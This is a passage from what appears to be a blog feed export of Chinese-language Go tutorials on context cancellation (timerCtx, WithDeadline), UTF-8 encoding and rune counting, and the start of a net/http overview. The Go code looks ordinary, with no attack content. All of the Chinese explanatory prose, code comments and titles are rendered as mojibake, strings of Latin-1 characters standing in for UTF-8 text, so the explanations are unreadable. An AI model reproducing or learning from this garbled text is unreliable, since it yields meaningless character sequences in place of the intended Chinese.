å…¥ä¸ºfalseï¼Œå› ä¸ºè¯¥æ–¹æ³•æ˜¯ç”±parent cancelè€Œå‘èµ·çš„ï¼Œchildren åªéœ€è´Ÿè´£å°†è‡ªèº«å’Œè‡ªèº«çš„ctxå–æ¶ˆå³å¯ï¼Œä¸éœ€è¦å†é‡å¤çš„å°†è‡ªèº«ä»parentä¸­çš„children mapä¸­åˆ é™¤ï¼Œå¦åˆ™ä¼šæœ‰åŒæ—¶éå†å’Œåˆ é™¤ä¸€ä¸ª map çš„é—®é¢˜</p><p>2ã€åœ¨WithCancel è¿”å›çš„é—­åŒ…cancelæ–¹æ³•ä¸­ï¼Œä¼ å…¥çš„æ˜¯trueã€‚å› ä¸ºè‡ªèº«cancelï¼Œéœ€è¦æŠŠè‡ªå·±ä»parent children mapä¸­ç§»é™¤ï¼ˆparentè¿˜æœªcancelï¼‰</p><h3 id="2-5ã€timeCtx-amp-context-WithTimeout-amp-context-WithDeadline"><a href="#2-5ã€timeCtx-amp-context-WithTimeout-amp-context-WithDeadline" class="headerlink" title="2.5ã€timeCtx &amp; context.WithTimeout &amp; context.WithDeadline"></a>2.5ã€timeCtx &amp; context.WithTimeout &amp; context.WithDeadline</h3><p>timerCtx åŸºäº cancelCtxï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ª time.Timer å’Œä¸€ä¸ª deadlineã€‚Timer ä¼šåœ¨ deadline åˆ°æ¥æ—¶ï¼Œè‡ªåŠ¨å–æ¶ˆ contextã€‚</p><pre><code class="hljs go"><span class="hljs-keyword">type</span> timerCtx <span class="hljs-keyword">struct</span> &#123;    cancelCtx    timer *time.Timer <span class="hljs-comment">// Under cancelCtx.mu.</span>    deadline time.Time&#125;</code></pre><h4 id="2-5-1ã€timerCtx-Deadline"><a href="#2-5-1ã€timerCtx-Deadline" class="headerlink" title="2.5.1ã€timerCtx.Deadline()"></a>2.5.1ã€timerCtx.Deadline()</h4><p>ä»…timerCtxå®ç°äº†Deadlineï¼Œè¿”å›è¿‡æœŸæ—¶é—´</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *timerCtx)</span> <span class="hljs-title">Deadline</span><span class="hljs-params">()</span> <span class="hljs-params">(deadline time.Time, ok <span class="hljs-keyword">bool</span>)</span></span> &#123;    <span class="hljs-keyword">return</span> c.deadline, <span class="hljs-literal">true</span>&#125;</code></pre><h4 id="2-5-2ã€timerCtx-cancel"><a href="#2-5-2ã€timerCtx-cancel" class="headerlink" title="2.5.2ã€timerCtx.cancel()"></a>2.5.2ã€timerCtx.cancel()</h4><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *timerCtx)</span> <span class="hljs-title">cancel</span><span class="hljs-params">(removeFromParent <span class="hljs-keyword">bool</span>, err error)</span></span> &#123;    <span class="hljs-comment">// å¤ç”¨ç»§æ‰¿çš„ cancelCtx çš„ cancel èƒ½åŠ›ï¼Œè¿›è¡Œ cancel å¤„ç†ï¼›</span>    c.cancelCtx.cancel(<span class="hljs-literal">false</span>, err)    <span class="hljs-keyword">if</span> removeFromParent &#123;        <span class="hljs-comment">// ä»çˆ¶èŠ‚ç‚¹ä¸­åˆ é™¤å­èŠ‚ç‚¹</span>        removeChild(c.cancelCtx.Context, c)    &#125;    c.mu.Lock()    <span class="hljs-keyword">if</span> c.timer != <span class="hljs-literal">nil</span> &#123;        <span class="hljs-comment">// å…³æ‰å®šæ—¶å™¨ï¼Œè¿™æ ·åœ¨deadline åˆ°æ¥æ—¶ï¼Œä¸ä¼šå†æ¬¡å–æ¶ˆ</span>        c.timer.Stop()        c.timer = <span class="hljs-literal">nil</span>    &#125;    c.mu.Unlock()&#125;</code></pre><h4 id="2-5-3ã€context-WithTimeout-amp-context-WithDeadline"><a href="#2-5-3ã€context-WithTimeout-amp-context-WithDeadline" class="headerlink" title="2.5.3ã€context.WithTimeout &amp; context.WithDeadline"></a>2.5.3ã€context.WithTimeout &amp; context.WithDeadline</h4><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithTimeout</span><span class="hljs-params">(parent Context, timeout time.Duration)</span> <span class="hljs-params">(Context, CancelFunc)</span></span> &#123;    <span class="hljs-keyword">return</span> WithDeadline(parent, time.Now().Add(timeout))&#125;<span class="hljs-comment">// Before reports whether the time instant t is before u.</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t Time)</span> <span class="hljs-title">Before</span><span class="hljs-params">(u Time)</span> <span class="hljs-title">bool</span></span> &#123;<span class="hljs-keyword">if</span> t.wall&amp;u.wall&amp;hasMonotonic != <span class="hljs-number">0</span> &#123;<span class="hljs-keyword">return</span> t.ext &lt; u.ext&#125;ts := t.sec()us := u.sec()<span class="hljs-keyword">return</span> ts &lt; us || ts == us &amp;&amp; t.nsec() &lt; u.nsec()&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithDeadline</span><span class="hljs-params">(parent Context, d time.Time)</span> <span class="hljs-params">(Context, CancelFunc)</span></span> &#123;<span class="hljs-keyword">if</span> parent == <span class="hljs-literal">nil</span> &#123;<span class="hljs-built_in">panic</span>(<span class="hljs-string">"cannot create context from nil parent"</span>)&#125;<span class="hljs-keyword">if</span> cur, ok := parent.Deadline(); ok &amp;&amp; cur.Before(d) &#123;                <span class="hljs-comment">// å¦‚æœparentçš„deadlineæ—©äºæœ¬ctxæŒ‡å®šçš„deadlineæ—¶é—´ï¼Œåˆ™ç›´æ¥æ„é€ ä¸€ä¸ªcancelCtx</span>                <span class="hljs-comment">// å½“parentè¶…æ—¶æ—¶ï¼Œç›´æ¥è°ƒç”¨cancelå–æ¶ˆæœ¬ctxï¼Œä¸å¿…åœ¨æ ¡éªŒæœ¬ctxçš„è¶…æ—¶é€»è¾‘</span><span class="hljs-comment">// The current deadline is already sooner than the new one.</span><span class="hljs-keyword">return</span> WithCancel(parent)&#125;c := &amp;timerCtx&#123;cancelCtx: newCancelCtx(parent),deadline:  d,&#125;        <span class="hljs-comment">// ä¼ é€’canceläº‹ä»¶ï¼Œå¹¶æ³¨å†Œè¿›parentçš„children map</span>propagateCancel(parent, c)dur := time.Until(d)<span class="hljs-keyword">if</span> dur &lt;= <span class="hljs-number">0</span> &#123;                <span class="hljs-comment">// å·²ç»åˆ°æœŸï¼Œå–æ¶ˆctxï¼Œerrä¸ºDeadlineExceeded</span>c.cancel(<span class="hljs-literal">true</span>, DeadlineExceeded) <span class="hljs-comment">// deadline has already passed</span><span class="hljs-keyword">return</span> c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; c.cancel(<span class="hljs-literal">false</span>, Canceled) &#125;&#125;c.mu.Lock()<span class="hljs-keyword">defer</span> c.mu.Unlock()<span class="hljs-keyword">if</span> c.err == <span class="hljs-literal">nil</span> &#123;                <span class="hljs-comment">// c.timer ä¼šåœ¨ d æ—¶é—´é—´éš”åï¼Œè‡ªåŠ¨è°ƒç”¨ cancel å‡½æ•°ï¼Œ</span>                <span class="hljs-comment">// å¹¶ä¸”ä¼ å…¥çš„é”™è¯¯å°±æ˜¯ DeadlineExceededï¼šè¶…æ—¶é”™è¯¯</span>c.timer = time.AfterFunc(dur, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;c.cancel(<span class="hljs-literal">true</span>, DeadlineExceeded)&#125;)&#125;<span class="hljs-keyword">return</span> c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; c.cancel(<span class="hljs-literal">true</span>, Canceled) &#125;&#125;</code></pre><h2 id="3ã€ä¾‹å­"><a href="#3ã€ä¾‹å­" class="headerlink" title="3ã€ä¾‹å­"></a>3ã€ä¾‹å­</h2><p>æœ€åä¸¾ä¾‹ä¸€ä¸ªå®ç°ä¸€ä¸ªcanceler interfaceï¼Œä½¿ä¸Šæ–‡2.4.5è¯´çš„propagateCancel æ–¹æ³•è¿›å…¥elseåˆ†æ”¯ï¼Œåˆ›å»ºé¢å¤–goroutineæ¥å¤„ç†ctx cancelçš„æƒ…å†µï¼š</p><p>åœ¨propagateCancel elseåˆ†æ”¯å¤„æ‰“æ–­ç‚¹å³å¯</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> context<span class="hljs-keyword">import</span> (<span class="hljs-string">"context"</span><span class="hljs-string">"sync"</span><span class="hljs-string">"testing"</span>)<span class="hljs-keyword">type</span> tachiuCancelCtx <span class="hljs-keyword">struct</span> &#123;context.Context               <span class="hljs-comment">// åµŒå…¥å†…ç½®çš„ Context æ¥å£</span>done            <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125; <span class="hljs-comment">// è‡ªå®šä¹‰çš„ done é€šé“</span>cancelOnce      sync.Once     <span class="hljs-comment">// ä¿è¯å–æ¶ˆæ“ä½œåªæ‰§è¡Œä¸€æ¬¡çš„ sync.Once</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *tachiuCancelCtx)</span> <span class="hljs-title">Done</span><span class="hljs-params">()</span> &lt;-<span class="hljs-title">chan</span> <span class="hljs-title">struct</span></span>&#123;&#125; &#123;<span class="hljs-keyword">return</span> m.done&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *tachiuCancelCtx)</span> <span class="hljs-title">Err</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> &#123;<span class="hljs-keyword">select</span> &#123;<span class="hljs-keyword">case</span> &lt;-m.done:<span class="hljs-keyword">return</span> context.Canceled<span class="hljs-keyword">default</span>:<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *tachiuCancelCtx)</span> <span class="hljs-title">Value</span><span class="hljs-params">(key <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">interface</span></span>&#123;&#125; &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *tachiuCancelCtx)</span> <span class="hljs-title">cancel</span><span class="hljs-params">()</span></span> &#123;m.cancelOnce.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-built_in">close</span>(m.done)&#125;)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithMyCancel</span><span class="hljs-params">(parent context.Context)</span> <span class="hljs-params">(context.Context, context.CancelFunc)</span></span> &#123;ctx := &amp;tachiuCancelCtx&#123;Context: parent,done:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),&#125;<span class="hljs-keyword">return</span> ctx, ctx.cancel&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestContext</span><span class="hljs-params">(t *testing.T)</span></span> &#123;parent := context.Background()<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰çš„ WithMyCancel å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ä¸Šä¸‹æ–‡</span>ctx, _ := WithMyCancel(parent)childCtx, _ := context.WithCancel(ctx)t.Log(childCtx)&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golangå¯¹unicodeçš„è¯»å†™æ–¹å¼</title>
    <link href="/2023/09/19/golang%E5%AF%B9unicode%E7%9A%84%E8%AF%BB%E5%86%99%E6%96%B9%E5%BC%8F/"/>
    <url>/2023/09/19/golang%E5%AF%B9unicode%E7%9A%84%E8%AF%BB%E5%86%99%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="ç»Ÿè®¡å­—ç¬¦é•¿åº¦è¸©çš„å‘"><a href="#ç»Ÿè®¡å­—ç¬¦é•¿åº¦è¸©çš„å‘" class="headerlink" title="ç»Ÿè®¡å­—ç¬¦é•¿åº¦è¸©çš„å‘"></a>ç»Ÿè®¡å­—ç¬¦é•¿åº¦è¸©çš„å‘</h3><pre><code class="hljs plain">import (    &quot;fmt&quot;    &quot;testing&quot;    &quot;unicode&#x2F;utf8&quot;) func TestUTF8Length(t *testing.T) &#123;    &#123;        s :&#x3D; &quot;hello&quot;        t.Logf(&quot;len(%s) &#x3D; %d&quot;, s, len(s))    &#125;    &#123;        s :&#x3D; &quot;ä½ å¥½&quot;        t.Logf(&quot;len(%s) &#x3D; %d&quot;, s, len(s))     &#125;&#125; func TestUnicodeLength(t *testing.T) &#123;    &#123;        s :&#x3D; &quot;hello&quot;        t.Logf(&quot;unicodeLen(%s) &#x3D; %d&quot;, s, utf8.RuneCountInString(s))    &#125;    &#123;        s :&#x3D; &quot;ä½ å¥½&quot;        t.Logf(&quot;unicodeLen(%s) &#x3D; %d&quot;, s, utf8.RuneCountInString(s))    &#125;    &#123;        s :&#x3D; &quot;ğŸ˜„&quot;        t.Logf(&quot;unicodeLen(%s) &#x3D; %d&quot;, s, utf8.RuneCountInString(s))    &#125;&#125; func TestUnicode(t *testing.T) &#123;    &#123;        s :&#x3D; &quot;hello z&quot;        t.Logf(&quot;print %s&quot;, s)        RangePrint(s)    &#125;    fmt.Println()    &#123;        s :&#x3D; &quot;ä½ å¥½&quot;        t.Logf(&quot;print %s&quot;, s)        RangePrint(s)    &#125;    fmt.Println()    &#123;        s :&#x3D; &quot;ğŸ˜„&quot;        t.Logf(&quot;print %s&quot;, s)        RangePrint(s)    &#125;&#125; func TestUtf8Bytes(t *testing.T) &#123;    &#123;        s :&#x3D; &quot;ğŸ˜„&quot;        for _, b :&#x3D; range []byte(s) &#123;            fmt.Printf(&quot;%#02x &quot;, b)        &#125;    &#125;&#125; func RangePrint(s string) &#123;    for _, char :&#x3D; range s &#123;        fmt.Printf(&quot;%U &quot;, char)    &#125;&#125;</code></pre><h3 id="UNICODE"><a href="#UNICODE" class="headerlink" title="UNICODE"></a>UNICODE</h3><p>UNICODE ä¸‡å›½ç  æ˜¯ISOç»Ÿä¸€è§„èŒƒçš„ä¸€ç§å­—ç¬¦é›†ï¼Œç»™æ¯ä¸ªå­—ç¬¦ä¸€ä¸ªå»æ ‡è¯†ã€‚ä¸€ä¸ªå­—ç¬¦çš„Unicodeç¼–å·ï¼ˆåˆç§°ä¸ºç ç‚¹ï¼‰æ˜¯ä¸€ä¸ª å”¯ä¸€æ•°å­— ï¼Œé€šå¸¸ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå–å€¼èŒƒå›´æ˜¯0åˆ°10FFFFï¼ˆè½¬æ¢æˆåè¿›åˆ¶å°±æ˜¯0åˆ°1114111ï¼‰ã€‚</p><h3 id="UTF"><a href="#UTF" class="headerlink" title="UTF"></a>UTF</h3><p>Unicodeæ˜¯æ•°ä¸å­—ç¬¦çš„å¯¹åº”å…³ç³»ï¼Œå®ƒæ˜¯ä¸€ç§æ¦‚å¿µï¼Œæ‰€ä»¥å®ƒåªå¯¹äººç±»æœ‰æ„ä¹‰ã€‚è®¡ç®—æœºä¸èƒ½å¤„ç†å’Œå­˜å‚¨æ¦‚å¿µï¼Œåªèƒ½å¤„ç†å’Œå­˜å‚¨æ•°æ®ã€‚æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æƒ³ä¸ªåŠæ³•ï¼ŒæŠŠUnicodeçš„æ¦‚å¿µè½¬æ¢æˆè®¡ç®—æœºå¯ä»¥å¤„ç†çš„å…·ä½“æ•°æ®ï¼Œè€Œè¿™æ˜¯â€œUTFâ€ï¼ˆUnicode Transformation Formatï¼ŒUnicodeè½¬æ¢æ ¼å¼ï¼ŒUnicodeè½¬å†™æ–¹å¼ï¼‰ã€‚<br>ç°ä»Šå¤§å¤šæ•°è®¡ç®—æœºä½“ç³»ç»“æ„éƒ½ä½¿ç”¨8ä¸ªäºŒè¿›åˆ¶ä½åšä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œâ€œUTFâ€çš„è®¾è®¡ç›®çš„ï¼Œæ˜¯æŠŠUnicodeè§„èŒƒä¸ºå­—ç¬¦åˆ†é…çš„ç¼–å·è½¬æ¢ä¸ºè®¡ç®—æœºå¯ä»¥ç›´æ¥å­˜å‚¨å’Œå¤„ç†çš„â€œå…«ä½å­—èŠ‚åºåˆ—â€ã€‚</p><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p><a href="https://en.wikipedia.org/wiki/UTF-8" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/UTF-8</a><br>1ä¸ªunicodeå­—ç¬¦è‡³å°‘8bitä½</p><p> <img src="/img/unicode.png" srcset="/img/loading.gif" alt="image"></p><p>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯0xxxxxxxï¼Œè¡¨ç¤ºè¯¥å­—ç¬¦åªæœ‰1å­—èŠ‚ã€‚<br>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯110xxxxxï¼Œè¡¨ç¤ºè¯¥å­—ç¬¦æœ‰2å­—èŠ‚ã€‚<br>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯1110xxxxï¼Œè¡¨ç¤ºè¯¥å­—ç¬¦æœ‰3å­—èŠ‚ã€‚<br>å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯11110xxxï¼Œè¡¨ç¤ºè¯¥å­—ç¬¦æœ‰4å­—èŠ‚ã€‚<br>10xxxxxxè¡¨ç¤ºå°¾éšå­—èŠ‚ã€‚<br>å®é™…ä¸Š5å­—èŠ‚å’Œ6å­—èŠ‚çš„ç¼–ç ä¸ä¼šå‡ºç°ï¼Œå› ä¸ºUnicodeæœ€å¤§ç ç‚¹åªåˆ°U+10FFFFï¼Œç”¨4å­—èŠ‚å°±å¤Ÿäº†ã€‚<br>æŠŠâ€œè™â€å­—åŠå…¶emojiè½¬æ¢ä¸ºUTF-8ç¼–ç ã€‚<br>è™ï¼š</p><ul><li><p>ç ç‚¹ä¸º U+864E</p></li><li><p>è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œ1000011001001110</p></li><li><p>ä»æœ«å°¾å¼€å§‹æŒ‰6ä½åˆ†ç»„ï¼Œ1000 011001 001110</p></li><li><p>éœ€è¦3å­—èŠ‚ï¼Œå¼€å¤´æ’å…¥1110ï¼Œä¸­é—´æ’å…¥ä¸¤ä¸ª10ï¼Œå¾—åˆ° 11101000 10011001 10001110</p></li><li><p>è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œå¾—åˆ° E8 99 8E</p></li></ul><p>è™çš„emojiï¼š</p><ul><li><p>ç ç‚¹ä¸º U+1F405</p></li><li><p>è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œ11111010000000101</p></li><li><p>ä»æœ«å°¾å¼€å§‹æŒ‰6ä½åˆ†ç»„ï¼Œå¾—åˆ° 11111 010000 000101</p></li><li><p>ç¬¬ä¸€éƒ¨åˆ†ä¸º5ä½ï¼Œå¼€å¤´æ’å…¥1110çš„è¯å°±9ä½äº†ï¼Œä¸€ä¸ªå­—èŠ‚æ”¾ä¸ä¸‹ï¼Œæ‰€ä»¥å‰é¢å¾—è¡¥ä¸€ä¸ªå­—èŠ‚ï¼Œç”¨4å­—èŠ‚è¡¨ç¤ºã€‚å­—èŠ‚ä¸­é—´å’Œæœ«å°¾ç©ºéš™å¡«å……0ï¼Œç„¶åæ¯ä¸ªå°¾éšå­—èŠ‚å‰é¢éƒ½è¡¥10ï¼Œä¹Ÿå°±æ˜¯ 11110000 10011111 10010000 10000101</p></li><li><p>è½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œå¾—åˆ° F0 9F 90 85</p></li></ul><p><a href="https://tool.oschina.net/hexconvert/" target="_blank" rel="noopener">https://tool.oschina.net/hexconvert/</a></p><p>è§£ç å™¨è¯»å–åˆ°E8å°±èƒ½çŸ¥é“ç¬¬ä¸€ä¸ªå­—ç¬¦3å­—èŠ‚ã€‚ç„¶åè·³è¿‡2å­—èŠ‚è¯»å–åˆ°F0å°±èƒ½çŸ¥é“ç¬¬äºŒä¸ªå­—ç¬¦4å­—èŠ‚ï¼Œæ‰€ä»¥ä¸ä¼šæœ‰è¾¹ç•Œé—®é¢˜ã€‚</p><pre><code class="hljs plain">&#x2F;&#x2F; Numbers fundamental to the encoding.const (   RuneError &#x3D; &#39;\uFFFD&#39;     &#x2F;&#x2F; å½“å‡ºç°æ— æ³•è§£ç çš„å­—èŠ‚åºåˆ—æˆ–æ— æ•ˆçš„Unicodeå­—ç¬¦æ—¶ï¼ŒGoè¯­è¨€ä¼šä½¿ç”¨è¯¥æ›¿æ¢å­—ç¬¦æ¥è¡¨ç¤ºé”™è¯¯æˆ–æ— æ•ˆçš„éƒ¨åˆ†ã€‚   RuneSelf  &#x3D; 0x80         &#x2F;&#x2F; ç”±utf-8å®šä¹‰å¯çŸ¥ï¼Œå°äºè¯¥å€¼çš„å³è¡¨ç¤ºè¯¥å­—ç¬¦æœ¬èº«   MaxRune   &#x3D; &#39;\U0010FFFF&#39; &#x2F;&#x2F; Maximum valid Unicode code point.   UTFMax    &#x3D; 4            &#x2F;&#x2F; æœ€å¤§çš„utf-8ç¼–ç unicode1å­—èŠ‚æ•°       ...       xx &#x3D; 0xF1 &#x2F;&#x2F; invalid: size 1   as &#x3D; 0xF0 &#x2F;&#x2F; ASCII: size 1   s1 &#x3D; 0x02 &#x2F;&#x2F; accept 0, size 2   s2 &#x3D; 0x13 &#x2F;&#x2F; accept 1, size 3   s3 &#x3D; 0x03 &#x2F;&#x2F; accept 0, size 3   s4 &#x3D; 0x23 &#x2F;&#x2F; accept 2, size 3   s5 &#x3D; 0x34 &#x2F;&#x2F; accept 3, size 4   s6 &#x3D; 0x04 &#x2F;&#x2F; accept 0, size 4   s7 &#x3D; 0x44 &#x2F;&#x2F; accept 4, size 4) type acceptRange struct &#123;   lo uint8 &#x2F;&#x2F; lowest value for second byte.   hi uint8 &#x2F;&#x2F; highest value for second byte.&#125; var acceptRanges &#x3D; [16]acceptRange&#123;   0: &#123;locb, hicb&#125;, &#x2F;&#x2F; 0x80, 0b10111111   1: &#123;0xA0, hicb&#125;, &#x2F;&#x2F; 0b10100000, 0b10111111   2: &#123;locb, 0x9F&#125;, &#x2F;&#x2F; 0x80, 0b10011111   3: &#123;0x90, hicb&#125;, &#x2F;&#x2F; 0b10010000, 0b10111111 ï¼ˆæ ‡è®°ä½çš„èŒƒå›´ï¼‰   4: &#123;locb, 0x8F&#125;, &#x2F;&#x2F; 0x80, 10001111&#125; &#x2F;&#x2F; first is information about the first byte in a UTF-8 sequence.var first &#x3D; [256]uint8&#123;   &#x2F;&#x2F;   1   2   3   4   5   6   7   8   9   A   B   C   D   E   F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x00-0x0F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x10-0x1F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x20-0x2F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x30-0x3F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x40-0x4F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x50-0x5F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x60-0x6F   as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, as, &#x2F;&#x2F; 0x70-0x7F   &#x2F;&#x2F;   1   2   3   4   5   6   7   8   9   A   B   C   D   E   F   xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, &#x2F;&#x2F; 0x80-0x8F   xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, &#x2F;&#x2F; 0x90-0x9F   xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, &#x2F;&#x2F; 0xA0-0xAF   xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, &#x2F;&#x2F; 0xB0-0xBF   xx, xx, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, &#x2F;&#x2F; 0xC0-0xCF   s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, s1, &#x2F;&#x2F; 0xD0-0xDF   s2, s3, s3, s3, s3, s3, s3, s3, s3, s3, s3, s3, s3, s4, s3, s3, &#x2F;&#x2F; 0xE0-0xEF   s5, s6, s6, s6, s7, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, xx, &#x2F;&#x2F; 0xF0-0xFF&#125; ... func RuneCountInString(s string) (n int) &#123;   ns :&#x3D; len(s)   for i :&#x3D; 0; i &lt; ns; n++ &#123;      c :&#x3D; s[i]      if c &lt; RuneSelf &#123; &#x2F;&#x2F; å°äº0x80çš„éƒ½è¡¨ç¤ºå•ä¸ªå­—ç¬¦ï¼Œç›´æ¥ç»§ç»­å¾ªç¯è®¡æ•°n +1         &#x2F;&#x2F; ASCII fast path         i++         continue      &#125;      &#x2F;&#x2F; first is information about the first byte in a UTF-8 sequence.      &#x2F;&#x2F; ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼ˆæ— ç¬¦å·256ï¼‰åœ¨utf-8çš„ä½ç½®ï¼Œæ˜¯16è¿›åˆ¶çš„xx-s7å˜é‡      x :&#x3D; first[c]      if x &#x3D;&#x3D; xx &#123;         i++ &#x2F;&#x2F; invalid.         continue      &#125;      size :&#x3D; int(x &amp; 7) &#x2F;&#x2F; ä¸ 111 è¿›è¡Œä¸è¿ç®— å–å¾—æœ«7ä½çš„sizeå€¼      if i+size &gt; ns &#123;         i++ &#x2F;&#x2F; Short or invalid.         continue      &#125;      accept :&#x3D; acceptRanges[x&gt;&gt;4] &#x2F;&#x2F; å³ç§»4ä½ å–å¾—acceptçš„å€¼      if c :&#x3D; s[i+1]; c &lt; accept.lo || accept.hi &lt; c &#123; &#x2F;&#x2F; æ ‡è®°ä½èŒƒå›´         size &#x3D; 1      &#125; else if size &#x3D;&#x3D; 2 &#123;      &#125; else if c :&#x3D; s[i+2]; c &lt; locb || hicb &lt; c &#123;         size &#x3D; 1      &#125; else if size &#x3D;&#x3D; 3 &#123;      &#125; else if c :&#x3D; s[i+3]; c &lt; locb || hicb &lt; c &#123;         size &#x3D; 1      &#125;      i +&#x3D; size   &#125;   return n&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
      <tag>Unicode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go net/httpçš„å°æ€»ç»“</title>
    <link href="/2023/08/08/net-http%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/08/net-http%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h2><h3 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h3><pre><code class="hljs golang"><span class="hljs-keyword">type</span> Handler <span class="hljs-keyword">interface</span> &#123;   ServeHTTP(ResponseWriter, *Request)&#125;<span class="hljs-keyword">type</span> Server <span class="hljs-keyword">struct</span> &#123;   Addr <span class="hljs-keyword">string</span>      <span class="hljs-comment">// è·¯ç”±å¤„ç†å™¨</span>   Handler Handler <span class="hljs-comment">// handler to invoke, http.DefaultServeMux if nil</span>   TLSConfig *tls.Config   ReadTimeout time.Duration   ReadHeaderTimeout time.Duration   WriteTimeout time.Duration   IdleTimeout time.Duration   MaxHeaderBytes <span class="hljs-keyword">int</span>   TLSNextProto <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Server, *tls.Conn, Handler)</span></span>   ConnState <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(net.Conn, ConnState)</span></span>   ErrorLog *log.Logger   BaseContext <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(net.Listener)</span> <span class="hljs-title">context</span>.<span class="hljs-title">Context</span></span>   ConnContext <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, c net.Conn)</span> <span class="hljs-title">context</span>.<span class="hljs-title">Context</span></span>   inShutdown atomicBool <span class="hljs-comment">// true when server is in shutdown</span>   disableKeepAlives <span class="hljs-keyword">int32</span>     <span class="hljs-comment">// accessed atomically.</span>   nextProtoOnce     sync.Once <span class="hljs-comment">// guards setupHTTP2_* init</span>   nextProtoErr      error     <span class="hljs-comment">// result of http2.ConfigureServer if used</span>   mu         sync.Mutex   listeners  <span class="hljs-keyword">map</span>[*net.Listener]<span class="hljs-keyword">struct</span>&#123;&#125;   activeConn <span class="hljs-keyword">map</span>[*conn]<span class="hljs-keyword">struct</span>&#123;&#125;   doneChan   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;   onShutdown []<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>   listenerGroup 